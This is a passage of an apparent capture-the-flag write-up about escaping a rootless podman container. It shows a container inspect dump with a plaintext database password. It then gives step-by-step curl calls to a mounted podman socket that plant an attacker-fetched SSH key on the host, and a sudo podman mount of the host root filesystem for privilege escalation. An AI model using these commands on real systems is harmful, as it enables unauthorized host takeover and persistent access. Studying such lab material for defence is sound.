  "HostsPath": "/run/user/1000/containers/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata/hosts",
  "StaticDir": "/home/selecta/.local/share/containers/storage/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata",
  "OCIConfigPath": "/home/selecta/.local/share/containers/storage/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata/config.json",
  "OCIRuntime": "crun",
  "ConmonPidFile": "/run/user/1000/containers/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata/conmon.pid",
  "PidFile": "/run/user/1000/containers/overlay-containers/e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a/userdata/pidfile",
  "Name": "poc",
  "RestartCount": 0,
  "Driver": "overlay",
  "MountLabel": "",
  "ProcessLabel": "",
  "AppArmorProfile": "",
  "EffectiveCaps": [
    "CAP_CHOWN",
    "CAP_DAC_OVERRIDE",
    "CAP_FOWNER",
    "CAP_FSETID",
    "CAP_KILL",
    "CAP_NET_BIND_SERVICE",
    "CAP_SETFCAP",
    "CAP_SETGID",
    "CAP_SETPCAP",
    "CAP_SETUID",
    "CAP_SYS_CHROOT"
  ],
  "BoundingCaps": [
    "CAP_CHOWN",
    "CAP_DAC_OVERRIDE",
    "CAP_FOWNER",
    "CAP_FSETID",
    "CAP_KILL",
    "CAP_NET_BIND_SERVICE",
    "CAP_SETFCAP",
    "CAP_SETGID",
    "CAP_SETPCAP",
    "CAP_SETUID",
    "CAP_SYS_CHROOT"
  ],
  "ExecIDs": [
    "d48e7409db2ff2e8ee7fb3df56fd3a0200e5aa50a592155f0f5406a117300f71"
  ],
  "GraphDriver": {
    "Name": "overlay",
    "Data": {
      "LowerDir": "/home/selecta/.local/share/containers/storage/overlay/48f7dedab12d4c5a1969b525cc4ad0629ce04eecff58f7c3da5845e55a723851/diff:/home/selecta/.local/share/containers/storage/overlay/4072616e258eeb978f51e30a29905aabd9732fe04420bb66c1df9151d45e38b6/diff:/home/selecta/.local/share/containers/storage/overlay/f97a01b79a982acb451c122195a8ca21d9faa6fd3e16661226e2ed05c580c510/diff:/home/selecta/.local/share/containers/storage/overlay/f4210afa99da75634bae40bb21747b61684ed752cf14fa9005c8654cd734e8b1/diff:/home/selecta/.local/share/containers/storage/overlay/edabec846b623518d40ac71edba42228e24f28fc29fa2efed738cc1e1528038e/diff:/home/selecta/.local/share/containers/storage/overlay/71991630ca4af70681a4949f3f427b7ff1ae8b736a9ce1dec629baec3fbca018/diff:/home/selecta/.local/share/containers/storage/overlay/0e04b48031928d5ffa40bd7151e43b074ab3d4dd0e283a09dfbad3246426469f/diff:/home/selecta/.local/share/containers/storage/overlay/b600b7d9e72bf8f09d2395847c9c7221f83ead0e8e2d63f92edc932daf2418f7/diff:/home/selecta/.local/share/containers/storage/overlay/f4f4ba060ac74826c9a264ee0915a495155e2a6b7f20c5437309ff373aff8a30/diff:/home/selecta/.local/share/containers/storage/overlay/03980cf7dd6bbf5292a655dca0fcc4e065e7dd4d2855e90727c7c11504856a10/diff:/home/selecta/.local/share/containers/storage/overlay/7a8f424c9f566ad6c12cf3bf3ea09bfa4a79b95da4600794d958b315d0b8ae84/diff:/home/selecta/.local/share/containers/storage/overlay/93ec41b2b14bf8ffa1fb516a2288b12aab8d84e9aec014fccf0a1637fbfe2f1a/diff:/home/selecta/.local/share/containers/storage/overlay/0dcb1662ad2ec0ee4dd5006857daa6ac3d68611e61eadbe74830db55103253e5/diff:/home/selecta/.local/share/containers/storage/overlay/df2707a0cd5823a0570dbca0a2a24d31c4d8bbc7ab73e3a47223b21fef55e32a/diff:/home/selecta/.local/share/containers/storage/overlay/7d590959641f9a08985edd4dbbebd0aea23fd174f4a69b113a62d6a697293db1/diff:/home/selecta/.local/share/containers/storage/overlay/43e96d68416892bf29abf58026506f042791657d06392214ab19202a1fd0c69c/diff:/home/selecta/.local/share/containers/storage/overlay/302dff69e12b2964fadfa03490771b5930ff7fca586317fad61bc4326802763a/diff:/home/selecta/.local/share/containers/storage/overlay/f721d4268fbad9206369f258f28bbda701ac4aaf68bdbd8605e73efb779878c8/diff:/home/selecta/.local/share/containers/storage/overlay/59a032d005839bc84a8eeb874c272b70e17fc61b9ac5e38636649d12df8ffcf3/diff:/home/selecta/.local/share/containers/storage/overlay/93f39adadefbf2b5d0ef61d73f6aff390cdbeee49e2302f8ed06c8bd77affb3d/diff:/home/selecta/.local/share/containers/storage/overlay/4dbc59584de3c74af107d1722bc653cad649a98c1880a66a972148a1721cdfb2/diff:/home/selecta/.local/share/containers/storage/overlay/a717501ae49d9d4273033143c6b7e47fa473e97330c4e340a66430e812abcce0/diff:/home/selecta/.local/share/containers/storage/overlay/c1ee28c1529a00977407d985824d06d294843c043088e32154f136d1f94f0b23/diff:/home/selecta/.local/share/containers/storage/overlay/c9c2594aa16d5bcdfe15ac9b46f36cf7f3aba2f956b4efc9979622ecabbabfe8/diff:/home/selecta/.local/share/containers/storage/overlay/fb1bd2fc52827db4ce719cc1aafd4a035d68bc71183b3bc39014f23e9e5fa256/diff",                                                                                                                                                                                                
      "MergedDir": "/home/selecta/.local/share/containers/storage/overlay/2f72b2da923063ac6aaa4ec1bd6f5d564850d21832c50f501f522ca681e9f1d5/merged",
      "UpperDir": "/home/selecta/.local/share/containers/storage/overlay/2f72b2da923063ac6aaa4ec1bd6f5d564850d21832c50f501f522ca681e9f1d5/diff",
      "WorkDir": "/home/selecta/.local/share/containers/storage/overlay/2f72b2da923063ac6aaa4ec1bd6f5d564850d21832c50f501f522ca681e9f1d5/work"
    }
  },
  "Mounts": [
    {
      "Type": "volume",
      "Name": "f1f52d415d5591b21efeba53620667217a5822c2e93891a592070bb0f84868b8",
      "Source": "/home/selecta/.local/share/containers/storage/volumes/f1f52d415d5591b21efeba53620667217a5822c2e93891a592070bb0f84868b8/_data",
      "Destination": "/var/lib/postgresql/data",
      "Driver": "local",
      "Mode": "",
      "Options": [
        "nodev",
        "exec",
        "nosuid",
        "rbind"
      ],
      "RW": true,
      "Propagation": "rprivate"
    },
    {
      "Type": "bind",
      "Source": "/run/user/1000/podman/podman.sock",
      "Destination": "/var/run/podman/podman.sock",
      "Driver": "",
      "Mode": "",
      "Options": [
        "nosuid",
        "nodev",
        "rbind"
      ],
      "RW": true,
      "Propagation": "rprivate"
    }
  ],
  "Dependencies": [],
  "NetworkSettings": {
    "EndpointID": "",
    "Gateway": "",
    "IPAddress": "",
    "IPPrefixLen": 0,
    "IPv6Gateway": "",
    "GlobalIPv6Address": "",
    "GlobalIPv6PrefixLen": 0,
    "MacAddress": "",
    "Bridge": "",
    "SandboxID": "",
    "HairpinMode": false,
    "LinkLocalIPv6Address": "",
    "LinkLocalIPv6PrefixLen": 0,
    "Ports": {
      "5432/tcp": null,
      "8000/tcp": [
        {
          "HostIp": "",
          "HostPort": "8000"
        }
      ]
    },
    "SandboxKey": "/run/user/1000/netns/cni-ee7ae9a5-0b92-4c2a-8d90-9054f3dc7dda"
  },
  "ExitCommand": [
    "/usr/bin/podman",
    "--root",
    "/home/selecta/.local/share/containers/storage",
    "--runroot",
    "/run/user/1000/containers",
    "--log-level",
    "warning",
    "--cgroup-manager",
    "systemd",
    "--tmpdir",
    "/run/user/1000/libpod/tmp",
    "--runtime",
    "crun",
    "--storage-driver",
    "overlay",
    "--events-backend",
    "journald",
    "container",
    "cleanup",
    "--rm",
    "e5ecaa10b9b756311174f71a698b96fbf8dd6cea1fc48ce39ed7e3c1e362049a"
  ],
  "Namespace": "",
  "IsInfra": false,
  "Config": {
    "Hostname": "e5ecaa10b9b7",
    "Domainname": "",
    "User": "",
    "AttachStdin": false,
    "AttachStdout": false,
    "AttachStderr": false,
    "Tty": false,
    "OpenStdin": false,
    "StdinOnce": false,
    "Env": [
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/postgresql/13/bin",
      "TERM=xterm",
      "container=podman",
      "PGDATA=/var/lib/postgresql/data",
      "POSTGRES_PASSWORD=SuperSecretPassword12345",
      "PG_MAJOR=13",
      "PG_VERSION=13.13-1.pgdg120+1",
      "GOSU_VERSION=1.16",
      "LANG=en_US.utf8",
      "HOME=/root",
      "HOSTNAME=e5ecaa10b9b7"
    ],
    "Cmd": [
      "postgres",
      "-c",
      "config_file=/etc/postgresql/postgresql.conf"
    ],
    "Image": "localhost/poc:latest",
    "Volumes": null,
    "WorkingDir": "/",
    "Entrypoint": "docker-entrypoint.sh",
    "OnBuild": null,
    "Labels": {
      "io.buildah.version": "1.23.1"
    },
    "Annotations": {
      "io.container.manager": "libpod",
      "io.kubernetes.cri-o.Created": "2024-10-31T14:48:08.528980731Z",
      "io.kubernetes.cri-o.TTY": "false",
      "io.podman.annotations.autoremove": "TRUE",
      "io.podman.annotations.init": "FALSE",
      "io.podman.annotations.privileged": "FALSE",
      "io.podman.annotations.publish-all": "FALSE",
      "org.opencontainers.image.base.digest": "sha256:36a9d3bcaaec706e27b973bb303018002633fd3be7c2ac367d174bafce52e84e",
      "org.opencontainers.image.base.name": "debian:bookworm-slim",
      "org.opencontainers.image.created": "2024-01-04T21:52:40Z",
      "org.opencontainers.image.revision": "d416768b1a7f03919b9cf0fef6adc9dcad937888",
      "org.opencontainers.image.source": "https://github.com/docker-library/postgres.git#d416768b1a7f03919b9cf0fef6adc9dcad937888:13/bookworm",
      "org.opencontainers.image.stopSignal": "2",
      "org.opencontainers.image.url": "https://hub.docker.com/_/postgres",
      "org.opencontainers.image.version": "13.13"
    },
    "StopSignal": 2,
    "CreateCommand": [
      "podman",
      "run",
      "--rm",
      "--name",
      "poc",
      "-p",
      "8000:8000",
      "-v",
      "/run/user/1000/podman/podman.sock:/var/run/podman/podman.sock",
      "-d",
      "poc"
    ],
    "Umask": "0022",
    "Timeout": 0,
    "StopTimeout": 10
  },
  "HostConfig": {
    "Binds": [
      "f1f52d415d5591b21efeba53620667217a5822c2e93891a592070bb0f84868b8:/var/lib/postgresql/data:rprivate,rw,nodev,exec,nosuid,rbind",
      "/run/user/1000/podman/podman.sock:/var/run/podman/podman.sock:rw,rprivate,nosuid,nodev,rbind"
    ],
    "CgroupManager": "systemd",
    "CgroupMode": "private",
    "ContainerIDFile": "",
    "LogConfig": {
      "Type": "journald",
      "Config": null,
      "Path": "",
      "Tag": "",
      "Size": "0B"
    },
    "NetworkMode": "slirp4netns",
    "PortBindings": {
      "5432/tcp": null,
      "8000/tcp": [
        {
          "HostIp": "",
          "HostPort": "8000"
        }
      ]
    },
    "RestartPolicy": {
      "Name": "",
      "MaximumRetryCount": 0
    },
    "AutoRemove": true,
    "VolumeDriver": "",
    "VolumesFrom": null,
    "CapAdd": [],
    "CapDrop": [
      "CAP_AUDIT_WRITE",
      "CAP_MKNOD",
      "CAP_NET_RAW"
    ],
    "Dns": [],
    "DnsOptions": [],
    "DnsSearch": [],
    "ExtraHosts": [],
    "GroupAdd": [],
    "IpcMode": "private",
    "Cgroup": "",
    "Cgroups": "default",
    "Links": null,
    "OomScoreAdj": 0,
    "PidMode": "private",
    "Privileged": false,
    "PublishAllPorts": false,
    "ReadonlyRootfs": false,
    "SecurityOpt": [],
    "Tmpfs": {},
    "UTSMode": "private",
    "UsernsMode": "",
    "ShmSize": 65536000,
    "Runtime": "oci",
    "ConsoleSize": [
      0,
      0
    ],
    "Isolation": "",
    "CpuShares": 0,
    "Memory": 0,
    "NanoCpus": 0,
    "CgroupParent": "user.slice",
    "BlkioWeight": 0,
    "BlkioWeightDevice": null,
    "BlkioDeviceReadBps": null,
    "BlkioDeviceWriteBps": null,
    "BlkioDeviceReadIOps": null,
    "BlkioDeviceWriteIOps": null,
    "CpuPeriod": 0,
    "CpuQuota": 0,
    "CpuRealtimePeriod": 0,
    "CpuRealtimeRuntime": 0,
    "CpusetCpus": "",
    "CpusetMems": "",
    "Devices": [],
    "DiskQuota": 0,
    "KernelMemory": 0,
    "MemoryReservation": 0,
    "MemorySwap": 0,
    "MemorySwappiness": 0,
    "OomKillDisable": false,
    "PidsLimit": 2048,
    "Ulimits": [],
    "CpuCount": 0,
    "CpuPercent": 0,
    "IOMaximumIOps": 0,
    "IOMaximumBandwidth": 0,
    "CgroupConf": null
  }
}
```

The container is not privileged, so we cannot use the standard docker way of creating a new container with a mapping of the host file system.

What we can do however, is create a new container, and map the home directory of the user and create a `.ssh` directory and drop  a `authorized_keys` file so we can ssh.

So what images do we have available?

```bash
curl -s --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/images/json | jq
```

We have two images available:

```json
[
  {
    "Id": "78e992cdc9ff6990dd99867de94cecf894c347408eab791f1bb0905e763708d5",
    "ParentId": "",
    "RepoTags": [
      "docker.io/library/postgres:13.13"
    ],
    "RepoDigests": [
      "sha256:ef119e5f4d6dd8be3cb83d3c155912e0e564088e957c73d23656726d63cd9300",
      "sha256:3db1ce3163e51d08149e529f88a206cebbd462f40a62ccadb7861b031b0be633"
    ],
    "Created": 1704405160,
    "Size": 420477596,
    "SharedSize": 0,
    "VirtualSize": 420477596,
    "Labels": null,
    "Containers": 0,
    "Names": [
      "docker.io/library/postgres:13.13"
    ],
    "Digest": "sha256:ef119e5f4d6dd8be3cb83d3c155912e0e564088e957c73d23656726d63cd9300",
    "History": [
      "docker.io/library/postgres:13.13"
    ]
  },
  {
    "Id": "58402cb278fbce0694e0d6d7a48ca689d773867e46dd3ef1a821644a27db7d08",
    "ParentId": "9a9625a4381ceafb6061414de0a04af90dbd9909dacfa2b460e58b34b8138bf5",
    "RepoTags": [
      "localhost/poc:latest"
    ],
    "RepoDigests": [
      "sha256:30ba26f95eb253d1bc1dc1fa4d8b21b086bc121bce24806a24702fc85b60b967"
    ],
    "Created": 1730477050,
    "Size": 452816776,
    "SharedSize": 0,
    "VirtualSize": 452816776,
    "Labels": {
      "io.buildah.version": "1.23.1"
    },
    "Containers": 1,
    "Names": [
      "localhost/poc:latest"
    ],
    "Digest": "sha256:30ba26f95eb253d1bc1dc1fa4d8b21b086bc121bce24806a24702fc85b60b967",
    "History": [
      "localhost/poc:latest"
    ]
  }
]
```

One is the stock postgres image the other is the poc image for the application (we're running this reverse shell in this container).

We need to create a new container from one of these images, that maps the `$HOME` directory of the user to a directory in the new container, and maintain the user id mapping as well so the file is stored with the uid of the user that runs the container.
(podman by default maps user id’s in the container to other id’s which is not what we want). If we look at the inspect information on the running `poc` container, we see where the container is anchored:

```json
  "Mounts": [
    { 
      "Type": "volume",
      "Name": "f1f52d415d5591b21efeba53620667217a5822c2e93891a592070bb0f84868b8",
      "Source": "/home/selecta/.local/share/containers/storage/volumes/f1f52d415d5591b21efeba53620667217a5822c2e93891a592070bb0f84868b8/_data",
      "Destination": "/var/lib/postgresql/data",
      "Driver": "local",
      "Mode": "",
      "Options": [
        "nodev",
        "exec",
        "nosuid",
        "rbind"
      ],
      "RW": true,
      "Propagation": "rprivate"
    },
...
```

The `poc` container is running from the `/home/selecta` directory, so we need to map that directory in our container.

We will use the poc image as a basis for our container, it has some additional tools available (like `busybox`).

We will use `curl` to talk to the REST API on the podman socket.

There are (at least) two ways to write a file on the host machine. The first method involves running a container for each command you want to execute, the second uses the REST API for exec with only one container (nice).

### Several containers

Create a container to create a `.ssh` directory, we created the following JSON file (`podman_escape.json`):

```json
{
  "image": "poc",
  "command": ["mkdir", "/hostdata/.ssh"],
  "env": { "POSTGRES_PASSWORD": "lalalala", "DEBUG": "false" },
  "mounts": [
            {
                "Type": "bind",
                "Source": "/home/selecta",
                "Destination": "/hostdata",
                "BindOptions": {
                    "Propagation": "rprivate",
                    "CreateMountpoint": true
                }
            }
  ],
  "privileged": false,
  "userns": { "nsmode" : "keep-id" }
}
```

We need the user namespace to map our container uid/gid to the same on the host (this is what the `userns` attribute is for).
We also need to set a postgres password, or the container won’t start. The startup command is used to create the .ssh directory on `/hostdata`.

Create the container:

```bash
curl -s -X POST -H 'Content-Type: application/json' -d@podman_escape.json --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/create

{"Id":"b2ef6388789c0d4392f40238268e3262ca2cf415605de202891826a21111eadb","Warnings":[]}
```

And start the container:

```bash
curl -X POST --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/7555847590c38cd58f92b2b8017175995500bbfc72c6cc0c5b9639592361beae/start
```

The second container is used to get a pub key via `curl` to store in `/hostdata/.ssh/authorized_keys` (as we're not in a fully interactive shell, output redirection with an echo command to write the key doesn't work):

```json
{
  "image": "poc",
  "command": ["curl", "http://192.168.1.14:81/kali.pub", "-o", "/hostdata/.ssh/authorized_keys"],
  "env": { "POSTGRES_PASSWORD": "lalalala", "DEBUG": "false" },
  "mounts": [
            {
                "Type": "bind",
                "Source": "/home/selecta",
                "Destination": "/hostdata",
                "BindOptions": {
                    "Propagation": "rprivate",
                    "CreateMountpoint": true
                }
            }
  ],
  "privileged": false,
  "userns": { "nsmode" : "keep-id" }
}
```

Create the container:

```bash
curl -s -X POST -H 'Content-Type: application/json' -d@podman_escape.json --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/create

{"Id":"150f183b8e6626f707dfbe217190dc20050dbf089f5fc38dec99a6440eb12d14","Warnings":[]}
```

And start the container:

```bash
curl -X POST --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/150f183b8e6626f707dfbe217190dc20050dbf089f5fc38dec99a6440eb12d14/start
```

We have dropped the ssh pub key on the host.

### Using exec (slightly more elegant)

The `poc` container is running from the `/home/selecta` directory, so we need to map that directory in our container. We start a new container and the main command is to sleep for 1day (to keep it running).
Use the following JSON file (`escape.json`) to create the container.:

```json
{
  "image": "poc",
  "command": ["sleep", "1d"],
  "env": { "POSTGRES_PASSWORD": "lalalala", "DEBUG": "false" },
  "mounts": [
            {
                "Type": "bind",
                "Source": "/home/selecta",
                "Destination": "/hostdata",
                "BindOptions": {
                    "Propagation": "rprivate",
                    "CreateMountpoint": true
                }
            }
  ],
  "privileged": false,
  "userns": { "nsmode" : "keep-id" }
}
```

We need the user namespace to map our container uid/gid to the same on the host (this is what the `userns` attribute is for). We also need to set a postgres password, or the container won’t start.
The startup command is used to make sure the container remains running and has no conflict with port 5432.

Create the container and start it:

```bash
CONTAINER=$(curl -s -X POST -H 'Content-Type: application/json' -d@escape.json --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/create|jq -r '.Id')

echo $CONTAINER
7289ac0a5b2d6c4cd6621ab17a72e0ecbeffca960684acae744681d8e2c9b68f

curl -X POST --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/$CONTAINER/start
```

Now that the container is running, we can send it commands to execute, similar to `podman exec`. Note that a created exec command is available for 5 minutes max, and once executed it is no longer available.

Test first to see if we can list the contents of the `/hostdata` directory (note that the first 8 bytes of the returned stream are binary data we skip with `dd`).
We need two json files, one with the `ls -al` command (`ls.json`);

```json
{
  "AttachStdin": false,
  "AttachStderr": true,
  "AttachStdout": true,
  "Detach": false,
  "WorkingDir": "/var/lib/postgresql",
  "Cmd": [
    "ls", "-al", "/hostdata"
  ]
}
```

After creating the exec, we can run it, and for that we need a second json file (`doexec.json`) that tells podman how to execute it:

```json
{
        "Detach":false,
        "Tty":false,
        "h":0,
        "w":0
}
```

We can combine these commands into a one liner, and skip the first 8 binary bytes in the returned stream:

```bash
EXEC=$(curl -s -X POST -H 'Content-Type: application/json' -d@ls.json --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/$CONTAINER/exec|jq -r '.Id') && curl -s -X POST -d@doexec.json -H 'Content-Type: application/json' --unix-socket /var/run/podman/podman.sock http://d/v3.4.4/libpod/exec/$EXEC/start | dd bs=1 skip=8

total 48
drwxr-x--- 6 selecta selecta 4096 Nov  1 16:42 .
dr-xr-xr-x 1 root    root    4096 Nov  2 15:18 ..
lrwxrwxrwx 1 selecta selecta    9 Nov  1 15:57 .bash_history -> /dev/null
-rw-r--r-- 1 selecta selecta  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 selecta selecta 3771 Jan  6  2022 .bashrc
drwx------ 3 selecta selecta 4096 Nov  1 15:54 .cache
drwxr-xr-x 4 selecta selecta 4096 Nov  1 15:52 .config
-rw------- 1 selecta selecta   20 Nov  1 16:35 .lesshst
drwx------ 3 selecta selecta 4096 Nov  1 15:52 .local
-rw-r--r-- 1 selecta selecta  807 Jan  6  2022 .profile
drwx------ 2 selecta selecta 4096 Nov  1 16:44 .ssh
-rw-r--r-- 1 selecta selecta    0 Oct 30 12:12 .sudo_as_admin_successful
-rw------- 1 selecta selecta 7118 Nov  1 16:37 .viminfo
```

Seems to work!

We use a second JSON command file (`curl.json`) to download the pub key and store it in the `.ssh` directory in `/hostdata` :

```json
{
  "AttachStdin": false,
  "AttachStderr": true,
  "AttachStdout": true,
  "Detach": false,
  "WorkingDir": "/var/lib/postgresql",
  "Cmd": [
    "curl", "-s", "http://192.168.1.14/kali.pub", "-o", "/hostdata/.ssh/authorized_keys"
  ]
}
```

```
EXEC=$(curl -s -X POST -H 'Content-Type: application/json' -d@curl.json --unix-socket /var/run/podman/podman.sock http://d/v4.0.2/libpod/containers/$CONTAINER/exec|jq -r '.Id') && curl -s -X POST -d@doexec.json -H 'Content-Type: application/json' --unix-socket /var/run/podman/podman.sock http://d/v3.4.4/libpod/exec/$EXEC/start | dd bs=1 skip=8
```

If the `.ssh` directory does not exist, we need another command file that creates the directory, this is left as an exercise to the reader.

As far as we know, it is not possible to run a command on the host via the container, so hence the drop of the pub key via curl.

### (not an) Alternative way

Another option seems to be to load the podman executable onto the container, but this requires loading a lot of libraries as well.
Easiest way seems to be to access the REST API.

## Host access

After dropping the pub key, we can now ssh into the host machine:

```bash
ssh -i kali selecta@192.168.1.5

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Oct 31 04:54:42 PM UTC 2024

  System load:            0.0
  Usage of /:             83.9% of 11.71GB
  Memory usage:           14%
  Swap usage:             0%
  Processes:              245
  Users logged in:        1
  IPv4 address for ens33: 192.168.1.5
  IPv6 address for ens33: 2001:bb6:953b:8a58:20c:29ff:fed4:3fd7

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

New release '24.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.
```

### Final privilege escalation

checking sudo priviliges 

```notion
selecta@selecta:~$ sudo -l
Matching Defaults entries for selecta on selecta:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User selecta may run the following commands on selecta:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /usr/bin/podman run *
    (ALL) NOPASSWD: /usr/bin/podman images
```

Seeing we can use `podman run` and `podman images`  with sudo without a password. We can use this  to start a priviliged container with a mount of the host filesystem in the container.

As podman is installed rootless, each user has their own `podman.sock` socket, so when we use `sudo podman` we will NOT see the images our `selecta` user sees.

Luckily for us, root left behind an `alpine` image (for testing probably):

```bash
sudo podman images

REPOSITORY                TAG         IMAGE ID      CREATED      SIZE
docker.io/library/alpine  latest      91ef0af61f39  8 weeks ago  8.09 MB
```

We can run this image as root to mount the `/` filesystem of the server in the container:

```bash
sudo podman run --rm -it --mount type=bind,source=/,target=/host_root alpine /bin/ash

/ # ls -l /host_root
total 2332744
lrwxrwxrwx    1 root     root             7 Sep 11 14:18 bin -> usr/bin
drwxr-xr-x    3 root     root          4096 Oct 30 12:10 boot
dr-xr-xr-x    2 root     root          4096 Sep 11 18:46 cdrom
drwxr-xr-x   18 root     root          3960 Nov  2 14:51 dev
drwxr-xr-x   99 root     root          4096 Nov  1 15:07 etc
drwxr-xr-x    3 root     root          4096 Oct 30 12:11 home
lrwxrwxrwx    1 root     root             7 Sep 11 14:18 lib -> usr/lib
lrwxrwxrwx    1 root     root             9 Sep 11 14:18 lib32 -> usr/lib32
lrwxrwxrwx    1 root     root             9 Sep 11 14:18 lib64 -> usr/lib64
lrwxrwxrwx    1 root     root            10 Sep 11 14:18 libx32 -> usr/libx32
drwx------    2 root     root         16384 Oct 30 12:09 lost+found
drwxr-xr-x    2 root     root          4096 Sep 11 14:18 media
drwxr-xr-x    2 root     root          4096 Sep 11 14:18 mnt
drwxr-xr-x    2 root     root          4096 Sep 11 14:18 opt
dr-xr-xr-x  306 root     root             0 Nov  2 14:51 proc
drwx------    4 root     root          4096 Nov  2 14:53 root
drwxr-xr-x   33 root     root           920 Nov  2 15:29 run
lrwxrwxrwx    1 root     root             8 Sep 11 14:18 sbin -> usr/sbin
drwxr-xr-x    6 root     root          4096 Sep 11 14:24 snap
drwxr-xr-x    2 root     root          4096 Sep 11 14:18 srv
-rw-------    1 root     root     2388656128 Oct 30 12:10 swap.img
dr-xr-xr-x   13 root     root             0 Nov  2 14:51 sys
drwxrwxrwt   13 root     root          4096 Nov  2 15:29 tmp
drwxr-xr-x   14 root     root          4096 Sep 11 14:18 usr
drwxr-xr-x   13 root     root          4096 Sep 11 14:22 var
```

Once in the container a user can see the root folder and access the root flag

```bash
# ls -al /host_root/root
total 36
drwx------    4 root     root          4096 Nov  2 15:30 .
drwxr-xr-x   20 root     root          4096 Oct 30 12:10 ..
-rw-------    1 root     root           221 Nov  2 14:53 .bash_history
-rw-r--r--    1 root     root          3106 Oct 15  2021 .bashrc
-rw-r--r--    1 root     root           161 Jul  9  2019 .profile
drwx------    2 root     root          4096 Oct 30 12:11 .ssh
-rw-------    1 root     root          1602 Nov  2 14:53 .viminfo
-rw-------    1 root     root            45 Nov  2 15:30 root.txt
drwx------    3 root     root          4096 Oct 30 12:11 snap
```
